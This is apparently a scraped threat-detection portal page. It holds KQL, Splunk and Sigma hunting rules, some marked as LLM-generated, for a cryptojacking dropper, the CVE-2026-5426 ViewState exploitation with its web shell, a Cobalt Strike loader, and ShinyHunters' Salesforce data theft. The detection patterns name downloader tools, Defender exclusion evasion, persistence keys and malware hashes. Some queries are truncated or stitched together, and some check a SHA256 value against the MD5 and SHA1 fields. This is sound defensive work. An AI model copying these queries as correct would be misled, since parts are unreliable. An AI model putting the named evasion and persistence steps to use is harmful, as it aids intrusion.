Detects the process-hollowing dropper (SimpleRunPE.exe, SHA256 1b2555b0...) and its self-copy RuntimeHost.exe written into the campaign's hidden install folder keyed by identifier D3F4E2A1 (incl. fallback %LocalAppData%\Microsoft\Windows\Caches\D3F4E2A1). Also pivots on the embedded PDB string and the C2 IP-resolved binary hash. Rationale: Combines the article's campaign identifier D3F4E2A1 (used as folder name, mutex Global\D3F4E2A1_Svc, and exclusion path), the dropper/persistence filenames, and the verbatim SHA256 — all unique strings that won't collide with legitimate software. PDB path (Simple-RunPE-Process-Hollowing-RUNPE) ties to the public PoC fork. Cross-checked against: • https://github.com/Watermwo/Simple-RunPE-Process-Hollowing • https://malware.news/t/from-poisoned-search-results-to-gpu-mining-a-cryptojacking-campaign-abusing-screenconnect-and-microsoft-net-utilities/107339

| where FolderPath has_any (@"\Caches\", @"\AppData\", @"D3F4E2A1") or FileName in~ ("RuntimeHost.exe","SimpleRunPE.exe")

| order by TimeGenerated desc

[LLM] Defender exclusion added via Add-MpPreference for campaign install path Installation Medium
Detects the defense-evasion step where the malware runs PowerShell with -NoProfile -NonInteractive -ExecutionPolicy Bypass to call Add-MpPreference -ExclusionPath, carving out its hidden D3F4E2A1 install location from Microsoft Defender scanning. Flags the exclusion-add behaviour, prioritising command lines that reference the campaign's Caches\D3F4E2A1 path. Rationale: Anchors on the article's verbatim PowerShell evasion command (Add-MpPreference -ExclusionPath with -NoProfile -NonInteractive -ExecutionPolicy Bypass) and boosts confidence when the exclusion path references the D3F4E2A1 / Caches install location. Kept as hunting because legit admins occasionally add exclusions. Cross-checked against: • https://gbhackers.com/seo-poisoning-attack/
ATT&CKT1562.001 T1059.001
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("powershell.exe","pwsh.exe")
| where ProcessCommandLine has "Add-MpPreference" and ProcessCommandLine has "ExclusionPath"
| extend HighConf = ProcessCommandLine has_any ("D3F4E2A1","Caches")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine, HighConf
| order by HighConf desc, Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\powershell.exe" or NewProcessName endswith "\\pwsh.exe"
| where CommandLine has "Add-MpPreference" and CommandLine has "ExclusionPath"
| extend HighConf = CommandLine has_any ("D3F4E2A1","Caches")
| where SubjectUserName !endswith "$"
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, CommandLine, HighConf
| order by HighConf desc, TimeGenerated desc

[LLM] Cryptojacking persistence: Run key WinSysCache Installation High
Detects creation of the campaign's machine/user Run-key persistence value named WinSysCache under CurrentVersion\Run, which re-launches the hidden RuntimeHost.exe miner/loader at logon. The value name is a campaign-specific masquerade for 'Windows System Cache'. Rationale: Uses the article's exact Run-key value name WinSysCache under both HKLM and HKCU CurrentVersion\Run — a unique masquerade string that legitimate software does not use, making the registry-value name alone high-fidelity. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/
ATT&CKT1547.001
Data sourcesEndpoint.Registry
DeviceRegistryEvents
| where Timestamp > ago(30d)
| where ActionType in ("RegistryValueSet","RegistryKeyCreated")
| where RegistryKey has @"\CurrentVersion\Run"
| where RegistryValueName =~ "WinSysCache"
| project Timestamp, DeviceName, InitiatingProcessAccountName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImRegistryEvent
| where TimeGenerated > ago(30d)
| where RegistryKey has @"\CurrentVersion\Run"
| where RegistryValue =~ "WinSysCache"
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey, RegistryValue, RegistryValueData, ActingProcessName
| order by TimeGenerated desc

[LLM] Cryptojacking persistence: 'Windows System Health' scheduled tasks Installation High
Detects creation of the campaign's masqueraded scheduled tasks — 'Windows System Health' (logon), 'Windows System Health Monitor' (boot +1h), and 'Windows System Health Check' (every 5 min) — all running with highest privileges to relaunch the miner/loader. These exact task names are campaign-specific. Rationale: Uses the three verbatim task names from the article's persistence table ('Windows System Health', '... Monitor', '... Check'); these names plus highest-privilege triggers are unique to the campaign and don't match any genuine Windows task. Defender query covers both schtasks.exe execution and the ScheduledTaskCreated telemetry for API-created tasks. Cross-checked against: • https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/
ATT&CKT1053.005
Data sourcesEndpoint.Processes
union
(
  DeviceProcessEvents
  | where Timestamp > ago(30d)
  | where FileName =~ "schtasks.exe"
  | where ProcessCommandLine has "/create" and ProcessCommandLine has "Windows System Health"
  | project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, Detail=ProcessCommandLine
),
(
  DeviceEvents
  | where Timestamp > ago(30d)
  | where ActionType == "ScheduledTaskCreated"
  | where AdditionalFields has "Windows System Health"
  | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, InitiatingProcessFileName, Detail=AdditionalFields
)
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4698
| where EventData has "Windows System Health"
| project TimeGenerated, Computer, SubjectUserName, EventData
| order by TimeGenerated desc

Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents

| where Timestamp > ago(1d)

| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files

    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5") or SHA1 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5") or MD5 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5") or SHA1 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5") or MD5 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,

[LLM] KnowledgeDeliver ViewState deserialization RCE: w3wp.exe spawns OS shells (CVE-2026-5426) Exploitation High
Hunts the post-exploitation moment of CVE-2026-5426 where a malicious signed ViewState payload achieves OS-level code execution and the IIS worker process (w3wp.exe) spawns command interpreters or recon binaries. This is the highest-fidelity signal of the KnowledgeDeliver zero-day chain and the Godzilla web shell command execution. Rationale: Pivots on the article's exact post-exploitation behaviour — ViewState deserialization yields OS-level RCE under the IIS worker w3wp.exe. The w3wp.exe parent + shell/recon child pair is called out explicitly as a strong signal by Mandiant/Google Cloud and Rescana write-ups of CVE-2026-5426. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability • https://www.rescana.com/post/active-exploitation-of-cve-2026-5426-in-knowledgedeliver-lms-enables-godzilla-bluebeam-web-shell-and-cobalt-strike-attac • https://asec.ahnlab.com/en/85088/
ATT&CKT1190 T1505.003 T1059.003
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "w3wp.exe"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","whoami.exe","net.exe","net1.exe","nltest.exe","systeminfo.exe","ipconfig.exe","tasklist.exe","reg.exe","schtasks.exe","certutil.exe","bitsadmin.exe","rundll32.exe","cscript.exe","wscript.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, ParentPath = InitiatingProcessFolderPath, ParentCmd = InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where ParentProcessName endswith "\\w3wp.exe"
| where NewProcessName has_any ("\\cmd.exe","\\powershell.exe","\\pwsh.exe","\\whoami.exe","\\net.exe","\\net1.exe","\\nltest.exe","\\systeminfo.exe","\\ipconfig.exe","\\tasklist.exe","\\reg.exe","\\schtasks.exe","\\certutil.exe","\\bitsadmin.exe","\\rundll32.exe","\\cscript.exe","\\wscript.exe")
| where SubjectUserName !endswith "$"
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

[LLM] ASP.NET ViewState MAC verification failures (Event ID 1316) on KnowledgeDeliver IIS hosts Exploitation Medium
Hunts the exploitation-attempt fingerprint of CVE-2026-5426: ASP.NET logging ViewState MAC validation failures (Application log Event ID 1316, source ASP.NET 4.0.30319.0, event code 4009). Repeated or first-seen failures on an internet-facing IIS host indicate an actor trialing crafted/signed ViewState payloads against the shared hardcoded machineKey. Rationale: Event ID 1316 / ASP.NET 4.0.30319.0 code 4009 ("Viewstate verification failed") is explicitly named by corroborating analyses of this campaign as the canonical exploit-attempt signal. Defender Advanced Hunting has no Application-channel table, so defender_kql is intentionally empty; Datadog/Falcon also do not list the Application channel, hence empty. Threshold (>=3) is empirical to cut benign single-event post-deploy noise. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability • https://www.rescana.com/post/active-exploitation-of-cve-2026-5426-in-knowledgedeliver-lms-enables-godzilla-bluebeam-web-shell-and-cobalt-strike-attac
ATT&CKT1190
Data sources
Event
| where TimeGenerated > ago(7d)
| where EventLog == "Application"
| where EventID == 1316
| where Source startswith "ASP.NET"
| where RenderedDescription has_any ("Viewstate","MAC validation","4009")
| summarize Failures = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated), Sample = any(RenderedDescription) by Computer
| where Failures >= 3
| order by Failures desc
CLOUD
`wineventlog_application` (EventCode=1316 OR EventID=1316) (SourceName="ASP.NET 4.0.30319.0" OR source="ASP.NET*") (Message="*Viewstate*" OR Message="*MAC validation*" OR Message="*4009*")
| stats count min(_time) as firstTime max(_time) as lastTime values(Message) as sampleMessage by host
| where count >= 3
| convert ctime(firstTime) ctime(lastTime)
| sort - count
[LLM] IIS worker (w3wp.exe) writing .aspx/.js/.config — Godzilla web shell drop & malicious JS injection Installation Medium
Hunts the install/persistence step of the KnowledgeDeliver intrusion where the compromised IIS worker writes web-servable files: dropping the Godzilla (.NET) web shell as .aspx, or modifying an application JavaScript file to prompt users to install a fake 'security authentication plugin' and load an attacker-controlled script. Targets file-write telemetry attributed to w3wp.exe. Rationale: Directly models the article's two install actions — Godzilla deployed as a .NET web shell and an application JavaScript file modified to load an attacker script / fake plugin. Attribution of the write to w3wp.exe is the high-fidelity constraint; benign apps rarely have the worker process write .aspx/.js to web roots at runtime. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability • https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/

| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName endswith "w3wp.exe"

[LLM] Cobalt Strike fake 'security authentication plugin' installer hash (KnowledgeDeliver campaign) Installation High
Alerts on the presence or execution of the org-specific Cobalt Strike loader delivered as a fake installer in the KnowledgeDeliver intrusion (SHA256 7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2). Victims were lured by injected JavaScript to download a fake 'security authentication plugin' that planted the beacon. Rationale: Exact SHA256 IOC for the campaign's Cobalt Strike loader (the fake 'security authentication plugin' installer) named in the article and the pre-extracted IOC list — a hard, low-FP indicator. Covered across both file-write (drop) and process (execution) telemetry; CloudWatch left empty as this is Windows endpoint telemetry. ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2") or SHA1 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2") or MD5 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2") or SHA1 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2") or MD5 in~ ("7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Charter confirms data breach after ShinyHunters extortion threat

BleepingComputer
2026-05-26 7 use cases 3 techniques 4 kill-chain phases detected

U.S. telecommunications giant Charter Communications has confirmed it suffered a data breach after the ShinyHunters extortion group threatened to leak stolen data unless a ransom is paid. [...]

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Risky/anonymized Microsoft Entra sign-in to Salesforce resource (ShinyHunters vishing ATO) · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Unauthorized Salesforce connected-app (malicious Data Loader) authorization
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Salesforce bulk/mass data export burst from anonymized IP (UNC6040 exfiltration) · OAuth consent / suspicious app grant
[LLM] Risky/anonymized Microsoft Entra sign-in to Salesforce resource (ShinyHunters vishing ATO) Delivery Medium
Hunts the Charter initial-access step: a vishing-compromised Microsoft Entra account producing a successful interactive sign-in flagged risky or from anonymizing/VPN infrastructure (UNC6040 favours Mullvad VPN) where the target resource is Salesforce. Ties the SSO compromise to the specific SaaS app the actor exfiltrated from. Rationale: Article states Charter's Entra account was vished and used to export from Salesforce; pivots on the Salesforce resource (ResourceDisplayName/appDisplayName) plus risk/anonymizer flags rather than a generic risky-login, matching UNC6040's Mullvad-VPN access pattern (cross-checked Google TI and MITRE C0059). Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/voice-phishing-data-extortion • https://attack.mitre.org/campaigns/C0059/

title: Risky Entra Sign-in to Salesforce Resource
id: 8f3b9d2e-1a4c-4e77-9b21-7c5d6e8a3f10
description: Successful interactive Entra sign-in to a Salesforce resource flagged risky or from anonymizing infrastructure, consistent with ShinyHunters/UNC6040 vishing account takeover.
references:

  - https://attack.mitre.org/campaigns/C0059/
author: SOC Detection Engineering
date: 2026/05/27

detection:

    ResourceDisplayName|contains: 'Salesforce'
    ResultType: 0
    IsInteractive: true
  risk:
    RiskLevelDuringSignIn:
      - 'medium'

level: high
source:azure.activeDirectory @evt.name:"Sign-in activity" @properties.appDisplayName:*Salesforce* (@properties.riskLevelDuringSignIn:(medium OR high) OR @properties.riskState:atRisk)
CLOUD
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Authentication where Authentication.app="*salesforce*" Authentication.action="success" by Authentication.user Authentication.src Authentication.app Authentication.signature | `drop_dm_object_name(Authentication)` | iplocation src | search NOT Country="United States" | table firstTime,lastTime,user,src,Country,app,signature
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Authentication where Authentication.app="*salesforce*" Authentication.action="success" by Authentication.user Authentication.src Authentication.app Authentication.signature | `drop_dm_object_name(Authentication)` | iplocation src | search NOT Country="United States" | table firstTime,lastTime,user,src,Country,app,signature
[LLM] Unauthorized Salesforce connected-app (malicious Data Loader) authorization Installation Medium
Hunts UNC6040's signature step: during the vishing call the actor walks the victim to the Salesforce connected-app setup page to authorize a malicious/modified 'Data Loader' OAuth app. Surfaces new connected-app authorizations in the Salesforce tenant via Defender for Cloud Apps, especially from anonymized infrastructure. Rationale: Article describes ShinyHunters breaching Salesforce via abused OAuth/connected-app access; the malicious 'Data Loader' connected-app authorization is the documented UNC6040 hallmark (Google TI), so matching on the app name + OAuth authorization action is high-fidelity. Sentinel left empty: Salesforce connected-app authorizations do not surface in the canonical Entra AuditLogs/SigninLogs tables; Datadog/Falcon/CloudWatch left empty as Salesforce SaaS telemetry is not shipped to those sources in this tenant. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/voice-phishing-data-extortion • https://cloud.google.com/blog/topics/threat-intelligence/unc6040-proactive-hardening-recommendations
ATT&CKT1528 T1550.001
Data sources

| where Timestamp > ago(30d)

| where ObjectName has_any ("Data Loader","DataLoader","Data-Loader","dataloader")
   or tostring(RawEventData) has_any ("Data Loader","DataLoader")
| project Timestamp, AccountDisplayName, AccountId, ActionType, ObjectName, IPAddress, IsAnonymousProxy, CountryCode, ISP, UserAgent

index=salesforce (eventType="ConnectedApplication*" OR action="connectedAppOAuthAuthorize" OR EVENT_TYPE="OAuthAppLoginEvent") | search (app="*Data Loader*" OR application="*Dataloader*" OR app="*Data-Loader*") | stats min(_time) as firstTime values(SOURCE_IP) as src values(USER_NAME) as user by app | convert ctime(firstTime)
[LLM] Salesforce bulk/mass data export burst from anonymized IP (UNC6040 exfiltration) Actions on Objectives Medium
Hunts the Charter exfiltration step: millions of customer records pulled from Salesforce via Bulk API / report exports in a short burst. Counts export-style activities per account/window in Defender for Cloud Apps and prioritizes those originating from anonymizing/VPN infrastructure characteristic of UNC6040. Rationale: Article quotes 40M records exfiltrated from Salesforce; UNC6040 exfil is documented as REST pagination / Bulk API download bursts (Google TI). Thresholded burst-count on export actions per account is the correct shape (not a single-event Sigma). Sentinel/Datadog/Falcon/CloudWatch empty: Salesforce export telemetry is only available here via Defender for Cloud Apps, not those sources. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/voice-phishing-data-extortion • https://attack.mitre.org/campaigns/C0059/
ATT&CKT1213 T1119
Data sources
let WindowMinutes = 10m;
CloudAppEvents
| where Timestamp > ago(7d)
| where Application has "Salesforce"
| where ActionType has_any ("Export","ReportExport","MassDownload","BulkApi","Download","QueryAll")
| where AccountDisplayName !endswith "$"
| summarize ExportEvents = count(),
            DistinctObjects = dcount(ObjectName),
